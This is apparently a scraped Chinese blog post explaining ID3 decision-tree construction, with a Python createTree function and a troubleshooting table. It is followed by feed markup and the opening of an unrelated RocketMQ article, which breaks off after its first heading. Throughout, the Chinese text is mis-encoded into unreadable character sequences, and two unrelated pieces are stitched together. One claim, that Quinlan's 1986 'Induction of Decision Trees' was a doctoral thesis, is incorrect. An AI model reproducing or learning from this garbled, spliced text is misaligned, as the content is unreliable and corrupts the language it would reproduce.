<p>ç›®å‰æˆ‘ä»¬å·²ç»å­¦ä¹ äº†ä»æ•°æ®é›†æ„é€ å†³ç­–æ ‘ç®—æ³•æ‰€éœ€è¦çš„å­åŠŸèƒ½æ¨¡å—ï¼Œå…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¾—åˆ°åŸå§‹æ•°æ®é›†ï¼Œç„¶ååŸºäºæœ€å¥½çš„å±æ€§å€¼åˆ’åˆ†æ•°æ®é›†ï¼Œç”±äºç‰¹å¾å¯èƒ½å¤šäºä¸¤ä¸ªï¼Œå› æ­¤å¯èƒ½å­˜åœ¨å¤§äºä¸¤ä¸ªåˆ†æ”¯çš„æ•°æ®é›†åˆ’åˆ†</li>
<li>ç¬¬ä¸€æ¬¡åˆ’åˆ†ä¹‹åï¼Œæ•°æ®é›†è¢«å‘ä¸‹ä¼ é€’åˆ°æ ‘çš„åˆ†æ”¯çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</li>
<li>åœ¨æ–°çš„èŠ‚ç‚¹ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ’åˆ†æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨é€’å½’çš„åŸåˆ™å¤„ç†æ•°æ®é›†ã€‚</li>
</ul>
<p>é€’å½’çº¦æŸçš„æ¡ä»¶æ˜¯ï¼š</p>
<ul>
<li>ç¨‹åºéå†å®Œæ‰€æœ‰åˆ’åˆ†æ•°æ®é›†çš„å±æ€§</li>
<li>æ¯ä¸ªåˆ†æ”¯ä¸‹çš„æ‰€æœ‰å®ä¾‹éƒ½æœ‰ç›¸åŒçš„åˆ†ç±»</li>
<li>å½“å‰èŠ‚ç‚¹åŒ…å«çš„æ ·æœ¬åˆé›†ä¸ºç©ºï¼Œä¸èƒ½åˆ’åˆ†</li>
</ul>
<p>åœ¨ç¬¬ 2 ç§æƒ…å½¢ä¸‹ï¼Œæˆ‘ä»¬æŠŠå½“å‰èŠ‚ç‚¹æ ‡è®°ä¸ºå¶èŠ‚ç‚¹ï¼Œå¹¶å°†å…¶ç±»åˆ«è®¾å®šä¸ºè¯¥èŠ‚ç‚¹æ‰€å«æ ·æœ¬æœ€å¤šçš„ç±»åˆ«ï¼Œä»»ä½•åˆ°è¾¾å¶èŠ‚ç‚¹çš„æ•°æ®å¿…ç„¶å±äºå¶èŠ‚ç‚¹çš„åˆ†ç±»ã€‚
åœ¨ç¬¬ 3 ç§æƒ…å½¢ä¸‹ï¼ŒåŒæ ·æŠŠå½“å‰èŠ‚ç‚¹æ ‡è®°ä¸ºå¶èŠ‚ç‚¹ï¼Œä½†å°†å…¶ç±»åˆ«è®¾å®šä¸ºå…¶çˆ¶èŠ‚ç‚¹æ‰€å«æ ·æœ¬æœ€å¤šçš„ç±»åˆ«ã€‚</p>
<h2 data-id="heading-6">ID3ç®—æ³•</h2>
<p>ID3 ç®—æ³•åŸå‹æœ€æ—©ç”± J.R. Quinlan åœ¨å…¶1986å¹´çš„åšå£«è®ºæ–‡ã€ŠInduction of Decision Treesã€‹ä¸­æå‡ºï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šå®Œæ•´ã€ç³»ç»Ÿçš„å†³ç­–æ ‘å­¦ä¹ ç®—æ³•ã€‚è¯¥ç®—æ³•åŸºäºä¿¡æ¯è®ºä¸­çš„ä¿¡æ¯å¢ç›Šå‡†åˆ™ï¼Œé‡‡ç”¨è‡ªé¡¶å‘ä¸‹çš„è´ªå¿ƒç­–ç•¥é€’å½’æ„å»ºå†³ç­–æ ‘ï¼Œå…¶ç†è®ºåŸºç¡€æ‰å®ï¼Œå®ç°ç®€å•ç›´è§‚ï¼Œå› æ­¤åœ¨æœºå™¨å­¦ä¹ é¢†åŸŸè·å¾—äº†å¹¿æ³›åº”ç”¨ã€‚</p>
<p>ID3 ç®—æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šåœ¨å†³ç­–æ ‘çš„æ¯ä¸ªéå¶èŠ‚ç‚¹ä¸Šï¼Œé€‰æ‹©å½“å‰ä¿¡æ¯å¢ç›Šæœ€å¤§çš„å±æ€§ä½œä¸ºåˆ’åˆ†æ ‡å‡†ã€‚å…·ä½“è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®¡ç®—æ•°æ®é›†çš„åˆå§‹ç†µ H(S)</li>
<li>å¯¹æ¯ä¸ªå€™é€‰å±æ€§ Aï¼Œè®¡ç®—å…¶ä¿¡æ¯å¢ç›Š Gain(S,A) = H(S) - Î£(|Sv|/|S|)*H(Sv)</li>
<li>é€‰æ‹©ä¿¡æ¯å¢ç›Šæœ€å¤§çš„å±æ€§ä½œä¸ºå½“å‰èŠ‚ç‚¹çš„åˆ’åˆ†å±æ€§</li>
<li>å¯¹æ¯ä¸ªå±æ€§å€¼åˆ†æ”¯é€’å½’æ‰§è¡Œä¸Šè¿°è¿‡ç¨‹</li>
</ol>
<p>ç„¶è€Œï¼ŒID3 ç®—æ³•å­˜åœ¨å‡ ä¸ªæ˜æ˜¾ç¼ºé™·ï¼š</p>
<ol>
<li>å€¾å‘äºé€‰æ‹©å–å€¼è¾ƒå¤šçš„å±æ€§ï¼ˆå¦‚"ID"è¿™ç§å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰</li>
<li>ä¸èƒ½å¤„ç†è¿ç»­å€¼å±æ€§</li>
<li>æ²¡æœ‰è€ƒè™‘è¿‡æ‹Ÿåˆé—®é¢˜</li>
<li>ä¸èƒ½å¤„ç†ç¼ºå¤±å€¼</li>
</ol>
<p>é’ˆå¯¹è¿™äº›é—®é¢˜ï¼ŒQuinlan åœ¨1993å¹´æå‡ºäº†æ”¹è¿›çš„ C4.5 ç®—æ³•ï¼Œä¸»è¦æ”¹è¿›åŒ…æ‹¬ï¼š</p>
<ol>
<li>å¼•å…¥å¢ç›Šç‡ï¼ˆGain Ratioï¼‰æ›¿ä»£ä¿¡æ¯å¢ç›Šï¼Œè§£å†³å±æ€§åå‘é—®é¢˜</li>
<li>å¢åŠ äº†å¯¹è¿ç»­å€¼å±æ€§çš„å¤„ç†èƒ½åŠ›</li>
<li>é‡‡ç”¨åå‰ªæç­–ç•¥é˜²æ­¢è¿‡æ‹Ÿåˆ</li>
<li>å¢åŠ äº†å¯¹ç¼ºå¤±å€¼çš„å¤„ç†æœºåˆ¶</li>
</ol>
<p>åç»­åœ¨1998å¹´ï¼ŒQuinlan åˆæ¨å‡ºäº† C5.0 å•†ä¸šç‰ˆæœ¬ï¼Œè¿›ä¸€æ­¥æé«˜äº†ç®—æ³•æ•ˆç‡å’Œå¯æ‰©å±•æ€§ã€‚è¿™ç§ç®—æ³•æ¼”è¿›è·¯å¾„å±•ç¤ºäº†å†³ç­–æ ‘æŠ€æœ¯ä»ç†è®ºåˆ°å®è·µçš„é€æ­¥å®Œå–„è¿‡ç¨‹ï¼Œä¹Ÿä½“ç°äº†æœºå™¨å­¦ä¹ ç®—æ³•åœ¨è§£å†³å®é™…é—®é¢˜æ—¶çš„æŒç»­ä¼˜åŒ–éœ€æ±‚ã€‚</p>
<p>ID3 ç®—æ³•çš„æ ¸å¿ƒæ˜¯å†³ç­–æ ‘å„ä¸ªèŠ‚ç‚¹åº”ç”¨ä¿¡æ¯å¢ç›Šå‡†åˆ™é€‰æ‹©ç‰¹å¾ï¼Œé€’å½’çš„æ„å»ºå†³ç­–æ ‘ã€‚å…·ä½“æ–¹æ³•æ˜¯ï¼š</p>
<ul>
<li>ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œå¯¹èŠ‚ç‚¹è®¡ç®—æ‰€æœ‰å¯èƒ½çš„ç‰¹å¾çš„ä¿¡æ¯å¢ç›Šã€‚</li>
<li>é€‰æ‹©ä¿¡æ¯å¢ç›Šæœ€å¤§çš„ç‰¹å¾ä½œä¸ºèŠ‚ç‚¹çš„ç‰¹å¾ï¼Œç”±è¯¥ç‰¹å¾çš„ä¸åŒå–å€¼å»ºç«‹å­èŠ‚ç‚¹ã€‚</li>
<li>å†å¯¹å­èŠ‚ç‚¹è°ƒç”¨ä»¥ä¸Šæ–¹æ³•ï¼Œæ„å»ºå†³ç­–æ ‘ã€‚</li>
<li>ç›´åˆ°æ‰€æœ‰ç‰¹å¾çš„ä¿¡æ¯å¢ç›Šå‡å¾ˆå°æˆ–æ²¡æœ‰ç‰¹å¾å¯ä»¥é€‰æ‹©ä¸ºæ­¢ï¼Œæœ€åå¾—åˆ°ä¸€é¢—å†³ç­–æ ‘ã€‚</li>
</ul>
<p>å…·ä½“ Python çš„ä»£ç å®ç°ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å‡½æ•°åŠŸèƒ½ï¼šåŸºäºæœ€å¤§ä¿¡æ¯å¢ç›Šåˆ‡åˆ†æ•°æ®é›†ï¼Œé€’å½’æ„å»ºå†³ç­–æ ‘
å‚æ•°è¯´æ˜ï¼š
dataSetï¼šåŸå§‹æ•°æ®é›†(æœ€åä¸€åˆ—æ˜¯æ ‡ç­¾)
returnï¼šmyTreeï¼šå­—å…¸å½¢å¼çš„æ ‘
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">createTree</span>(<span class="hljs-params">dataSet</span>):
    featlist = <span class="hljs-built_in">list</span>(dataSet.columns)  <span class="hljs-comment"># æå–å‡ºæ•°æ®é›†æ‰€æœ‰çš„åˆ—</span>
    classlist = dataSet.iloc[:, -<span class="hljs-number">1</span>].value_counts()  <span class="hljs-comment"># è·å–æœ€åä¸€åˆ—ç±»æ ‡ç­¾</span>
    
    <span class="hljs-comment"># åˆ¤æ–­æœ€å¤šæ ‡ç­¾æ•°ç›®æ˜¯å¦ç­‰äºæ•°æ®é›†è¡Œæ•°ï¼Œæˆ–è€…æ•°æ®é›†æ˜¯å¦åªæœ‰ä¸€åˆ—</span>
    <span class="hljs-keyword">if</span> classlist.iloc[<span class="hljs-number">0</span>] == dataSet.shape[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> dataSet.shape[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> classlist.index[<span class="hljs-number">0</span>]  <span class="hljs-comment"># å¦‚æœæ˜¯ï¼Œè¿”å›ç±»æ ‡ç­¾</span>
    
    axis = bestSplit(dataSet)  <span class="hljs-comment"># ç¡®å®šå½“å‰æœ€ä½³åˆ‡åˆ†åˆ—çš„ç´¢å¼•</span>
    bestfeat = featlist[axis]  <span class="hljs-comment"># è·å–è¯¥ç´¢å¼•å¯¹åº”çš„ç‰¹å¾</span>
    myTree = {bestfeat: {}}  <span class="hljs-comment"># é‡‡ç”¨å­—å…¸åµŒå¥—çš„æ–¹å¼å­˜å‚¨æ ‘ä¿¡æ¯</span>
    
    <span class="hljs-keyword">del</span> featlist[axis]  <span class="hljs-comment"># åˆ é™¤å½“å‰ç‰¹å¾</span>
    valuelist = <span class="hljs-built_in">set</span>(dataSet.iloc[:, axis])  <span class="hljs-comment"># æå–æœ€ä½³åˆ‡åˆ†åˆ—æ‰€æœ‰å±æ€§å€¼</span>
    
    <span class="hljs-comment"># å¯¹æ¯ä¸€ä¸ªå±æ€§å€¼é€’å½’å»ºæ ‘</span>
    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> valuelist:
        myTree[bestfeat][value] = createTree(mySplit(dataSet, axis, value))
    
    <span class="hljs-keyword">return</span> myTree


<span class="hljs-comment"># æŸ¥çœ‹è¿è¡Œç»“æœ</span>
myTree = createTree(dataSet)
<span class="hljs-built_in">print</span>(myTree)

</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a115b999629f40c8bd9e6a154db96fa2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=iqTpLvMr5%2BraTI18%2Ba%2BfHPd2CwI%3D" alt="å†³ç­–æ ‘çš„ç”Ÿæˆ" loading="lazy"/></p>
<h2 data-id="heading-7">ID3ç®—æ³•å±€é™æ€§</h2>
<p>ID3 ç®—æ³•çš„å±€é™æ€§ä¸»è¦æºäºå±€éƒ¨æœ€ä¼˜åŒ–æ¡ä»¶ï¼Œå³ä¿¡æ¯å¢ç›Šçš„è®¡ç®—æ–¹æ³•ï¼Œå…¶å±€é™æ€§ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>åˆ†æ”¯åº¦è¶Šé«˜ï¼ˆåˆ†ç±»æ°´å¹³è¶Šå¤šï¼‰çš„ç¦»æ•£å˜é‡å¾€å¾€å­èŠ‚ç‚¹çš„æ€»ä¿¡æ¯ç†µæ›´å°ï¼ŒID3 æ˜¯æŒ‰ç…§æŸä¸€åˆ—è¿›è¡Œåˆ‡åˆ†ï¼Œæœ‰ä¸€äº›åˆ—çš„åˆ†ç±»å¯èƒ½ä¸ä¼šå¯¹ç»“æœæœ‰è¶³å¤Ÿå¥½çš„æŒ‡ç¤ºã€‚æç«¯æƒ…å†µä¸‹å– ID ä½œä¸ºåˆ‡åˆ†å­—æ®µï¼Œæ¯ä¸ªåˆ†ç±»çš„çº¯åº¦éƒ½æ˜¯ 100%ï¼Œå› æ­¤è¿™æ ·çš„åˆ†ç±»æ–¹å¼æ˜¯æ²¡æœ‰æ•ˆç›Šçš„ã€‚</li>
<li>ä¸èƒ½ç›´æ¥å¤„ç†è¿ç»­å‹å˜é‡ï¼Œè‹¥è¦ä½¿ç”¨ ID3 å¤„ç†è”ç³»å‹å˜é‡ï¼Œåˆ™é¦–å…ˆéœ€è¦å¯¹è¿ç»­å˜é‡è¿›è¡Œç¦»æ•£åŒ–ã€‚</li>
<li>å¯¹ç¼ºå¤±å€¼è¾ƒä¸ºæ•æ„Ÿï¼Œä½¿ç”¨ ID3 ä¹‹å‰éœ€è¦æå‰å¯¹ç¼ºå¤±å€¼è¿›è¡Œå¤„ç†ã€‚</li>
<li>æ²¡æœ‰å‰ªæçš„è®¾ç½®ï¼Œå®¹æ˜“å¯¼è‡´è¿‡æ‹Ÿåˆï¼Œå³åœ¨è®­ç»ƒé›†ä¸Šè¡¨ç°å¾ˆå¥½ï¼Œæµ‹è¯•é›†ä¸Šè¡¨ç°å¾ˆå·®</li>
</ul>
<p>å¯¹äº ID3 çš„å‚¨å¤šä¼˜åŒ–æªæ–½ï¼Œæœ€ç»ˆä¹Ÿæ„æˆäº† C4.5 ç®—æ³•çš„æ ¸å¿ƒå†…å®¹ã€‚</p>
<h2 data-id="heading-8">C4.5ç®—æ³•</h2>
<p>C4.5 ç®—æ³•ä¸ ID3 ç®—æ³•ç›¸ä¼¼ï¼ŒC4.5 ç®—æ³•å¯¹ ID3 ç®—æ³•è¿›è¡Œäº†æ”¹è¿›ï¼ŒC4.5 åœ¨ç”Ÿæˆçš„è¿‡ç¨‹ä¸­ï¼Œç”¨ä¿¡æ¯å¢ç›Šæ¯”å‡†åˆ™æ¥é€‰æ‹©ç‰¹å¾</p>
<h2 data-id="heading-9">é”™è¯¯é€ŸæŸ¥</h2>





















































<table><thead><tr><th>ç—‡çŠ¶</th><th>æ ¹å› </th><th>å®šä½</th><th>ä¿®å¤</th></tr></thead><tbody><tr><td>ç†µè®¡ç®—å¾—åˆ° nan æˆ– inf</td><td>æ¦‚ç‡ä¸º 0 æ—¶ log2(0)</td><td>calEnt() ä¸­ p æ˜¯å¦å‡ºç° 0</td><td>è¿‡æ»¤ 0 æ¦‚ç‡ï¼šp = p[p&gt;0] åå†ç®—ï¼›æˆ–åŠ æå°å€¼ eps</td></tr><tr><td>ä¿¡æ¯å¢ç›Šå…¨ä¸º 0/å¾ˆå°</td><td>æ ‡ç­¾åˆ—é€‰é”™ã€æ•°æ®è¢«é”™è¯¯è¿‡æ»¤å¯¼è‡´ç†µä¸å˜</td><td>dataSet.iloc[:, -1] æ˜¯å¦çœŸæ˜¯æ ‡ç­¾ï¼›å­é›†æ˜¯å¦ä¸ºç©º</td><td>æ˜ç¡®æ ‡ç­¾åˆ—ï¼›æ£€æŸ¥ childSet.shape[0]ï¼›ç©ºå­é›†è·³è¿‡</td></tr><tr><td>bestSplit è¾“å‡ºåˆ—ä¸ç¨³å®š</td><td>set() éå†æ— åºã€value_counts().index é¡ºåºå½±å“æ‰“å°è§‚æ„Ÿ</td><td>levelsã€valuelist çš„æ¥æº</td><td>ç”¨ sorted(levels) ä¿æŒç¡®å®šæ€§ï¼›æ ‘åˆ†æ”¯ä¹Ÿç”¨æ’åº</td></tr><tr><td>drop(..., axis=1) æŠ¥å‚æ•°é”™è¯¯/å‘Šè­¦</td><td>pandas ç‰ˆæœ¬å·®å¼‚æˆ–ä¼ å‚ä¹ æƒ¯ä¸ä¸€è‡´</td><td>drop(col, axis=1) å¤„å›ºå®šå†™æ³•</td><td>drop(columns=[col])</td></tr><tr><td>é€’å½’å»ºæ ‘åç»“æœå¼‚å¸¸æ·±/è¿‡æ‹Ÿåˆ</td><td>æ— å‰ªæã€ç¦»æ•£å–å€¼å¤šå¯¼è‡´åˆ†æ”¯çˆ†ç‚¸</td><td>createTree() æ¯å±‚åˆ’åˆ†åˆ†æ”¯æ•°</td><td>å¼•å…¥æœ€å°æ ·æœ¬æ•°/æœ€å¤§æ·±åº¦/ä¿¡æ¯å¢ç›Šé˜ˆå€¼ï¼›æˆ–åˆ‡æ¢ C4.5/å‰ªæç­–ç•¥</td></tr><tr><td>å–â€œIDåˆ—/å”¯ä¸€å€¼åˆ—â€ä½œä¸ºæœ€ä½³ç‰¹å¾</td><td>ä¿¡æ¯å¢ç›Šåå¥½å¤šå–å€¼å±æ€§</td><td>è§‚å¯ŸæŸåˆ—å–å€¼æ•°é‡è¿œå¤§äºå…¶ä»–åˆ—</td><td>ç”¨å¢ç›Šç‡ï¼ˆC4.5ï¼‰æˆ–é¢„å…ˆå‰”é™¤é«˜åŸºæ•°æ ‡è¯†åˆ—</td></tr><tr><td>è¿ç»­å€¼ç‰¹å¾æ— æ³•å¤„ç†</td><td>ä»£ç æŒ‰ç¦»æ•£å–å€¼åˆ’åˆ†levels = value_counts().index ç›´æ¥æšä¸¾</td><td>è¿ç»­ç‰¹å¾</td><td>å…ˆåˆ†ç®±ç¦»æ•£åŒ–ï¼›æˆ–å®ç°é˜ˆå€¼åˆ‡åˆ†ï¼ˆæ’åº+æšä¸¾åˆ‡ç‚¹ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-10">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-11">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-12">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-207 RabbitMQ Direct äº¤æ¢å™¨è·¯ç”±ï¼šRoutingKey ç²¾ç¡®åŒ¹é…ã€é˜Ÿåˆ—å¤šç»‘å®šä¸æ—¥å¿—åˆ†æµå®æˆ˜</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-13">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CommitLogé¡ºåºå†™ â€”â€” ä¸ºä»€ä¹ˆRoceketMQæ‰€æœ‰æ¶ˆæ¯éƒ½å¾€ä¸€ä¸ªæ–‡ä»¶è¿½åŠ ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589962224795713574</link>    <guid>https://juejin.cn/post/7589962224795713574</guid>    <pubDate>2026-01-02T06:16:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795713574" data-draft-id="7590503651115892786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CommitLogé¡ºåºå†™ â€”â€” ä¸ºä»€ä¹ˆRoceketMQæ‰€æœ‰æ¶ˆæ¯éƒ½å¾€ä¸€ä¸ªæ–‡ä»¶è¿½åŠ ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,RocketMQ,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T06:16:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CommitLogé¡ºåºå†™ â€”â€” ä¸ºä»€ä¹ˆRoceketMQæ‰€æœ‰æ¶ˆæ¯éƒ½å¾€ä¸€ä¸ªæ–‡ä»¶è¿½åŠ ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:16:31.000Z" title="Fri Jan 02 2026 06:16:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€ï¼šé«˜æ€§èƒ½æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</h2>
